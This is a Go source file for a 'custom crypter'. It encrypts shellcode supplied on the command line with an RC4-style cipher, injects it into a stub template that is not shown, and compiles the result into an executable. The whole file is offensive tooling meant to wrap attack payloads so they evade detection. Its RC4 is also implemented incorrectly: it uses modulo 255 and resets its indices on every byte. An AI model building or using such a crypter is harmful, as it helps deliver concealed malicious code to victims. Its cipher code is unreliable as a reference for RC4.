/*
;
; Filename: crypt.go
; Author:  Plaix
; Website:	http://slacklabs.be
; Github:	https://github.com/plaix
; Twitter:	https://twitter.com/@pl4ix
;
; Purpose:
;
; Custom crypter based on the 'flawed' RC4 stream cypher
; Will encrypt shellcode and use stub.go as a template to create a compiled executable
; Will seed with a random salt just because it can (tm)
;
*/

package main

import "fmt"
import "os"
import "os/exec"
import "io/ioutil"
import "strings"
import "bytes"

import "encoding/hex"

// RC4 info: https://en.wikipedia.org/wiki/RC4

// returns byte slice and accepts string, converts key string to bytearray
func rc4_ksa(key string) []byte {
	keyArray := []byte(key)
	var S []byte
	S = make([]byte, 256)
	for i := 0; i < 256; i++ {
		// initialize box
		S[i] = byte(i)
	}
	// randomize the box with the key
	var j byte = 0
	for i := 0; i < 256; i++ {
		j = (j + S[i] + keyArray[i%len(keyArray)]) % 255
		S[i], S[j] = S[j], S[i]
	}

	return S

}

func rc4_prga(sBox []byte, c byte) byte {
	var i byte = 0
	var j byte = 0

	i = (i + 1) % 255
	j = (j + sBox[i]) % 255
	sBox[i], sBox[j] = sBox[j], sBox[i]
	K := sBox[(sBox[i]+sBox[j])%255]
	// xor with c byte
	K = K ^ c
	return K
}

func string_to_slice(data string) []byte {
	/*
		Ugly hack to get shellcode provided through command line arguments
		into the correct form again
		I hope there's another way to do this, but for now this will do
	*/

	// convert shellcode to correct byte slice
	var sArr = make([]byte, 0)
	for x := 0; x < len(data); x = x + 4 {
		var s string
		s = data[x+2 : x+4]
		bs, err := hex.DecodeString(s)
		if err != nil {
			fmt.Println(err)
		}
		sArr = append(sArr, bs[0])
	}

	return sArr
}

func rc4_run(key string, data string) []byte {
	sBox := rc4_ksa(key)
	// encrypt the text with initialized box sBox

	sArr := string_to_slice(data)
	fmt.Printf("Shellcode length: %i", len(sArr))
	fmt.Println()
	fmt.Println()
	// initialize result bytearray to grow it later on
	var rArr []byte
	rArr = make([]byte, 0)

	for x := 0; x < len(sArr); x++ {
		K := rc4_prga(sBox, sArr[x])
		rArr = append(rArr, K)

	}
	for x := 0; x < len(rArr); x++ {
		fmt.Printf(fmt.Sprintf("\\x%02x", rArr[x]))
	}
	fmt.Println()
	return rArr
}
func check(e error) {
	if e != nil {
		fmt.Printf("Error: \t %s", e)
		fmt.Println()
		panic(e)
	}
}

func create_stub(outputfile string, sh []byte) bool {
	// use the stub.go as a template to create an executable shellcode
	fmt.Println("[+] Creating executable using stub.go...\n")
	template, err := ioutil.ReadFile("stub.go")
	check(err)
	//fmt.Println(string(sh))

	// put the byte slice in hex notation
	shBuf := make([]string, 0)
	for x := 0; x < len(sh); x++ {
		//fmt.Printf(fmt.Sprintf("\\x%02x", sh[x]))
		shBuf = append(shBuf, fmt.Sprintf("\\x%02x", sh[x]))
	}

	stub := strings.Replace(string(template), "SHELLCODEMARKER", strings.Join(shBuf, ""), 1)
	//fmt.Print(string(stub))

	// dump the modified code to file
	//err = ioutil.WriteFile(outputfile+".go", stub, 0644)

	// will truncate file if already exists
	f, err := os.Create("build/" + outputfile + ".go")
	check(err)
	n3, err := f.WriteString(stub)
	fmt.Printf("[+] Wrote %d bytes to stub\n", n3)
	check(err)
	f.Sync()

	// build go file
	// get the path
	path, err := exec.LookPath("go")
	check(err)
	// the space after " build" is very important apparently ;D
	cmd := exec.Command(path, "build", "-o", "build/"+outputfile, "build/"+outputfile+".go")
	// set the env so the go path is known
	env := os.Environ()
	cmd.Env = env
	var out bytes.Buffer
	var er bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &er
	//fmt.Println(cmd.Args)
	//fmt.Println(cmd.Env)
	err = cmd.Run()
	fmt.Println(er.String())
	check(err)
	fmt.Println(out.String())
	fmt.Printf("Binary available at %s.\n[+] Have fun!\n\n", "build/"+outputfile)
	return true
}

func main() {

	args := os.Args
	if len(os.Args) <= 3 {
		fmt.Printf("Usage: %s key shellcode outputfile\n", args[0])
	} else {
		fmt.Printf("[+] Encrypting shellcode with key: %s \n", args[1])

		rArr := rc4_run(args[1], args[2])
		if rArr != nil {

			fmt.Println("Done")
		}

		create_stub(args[3], rArr)
	}

}
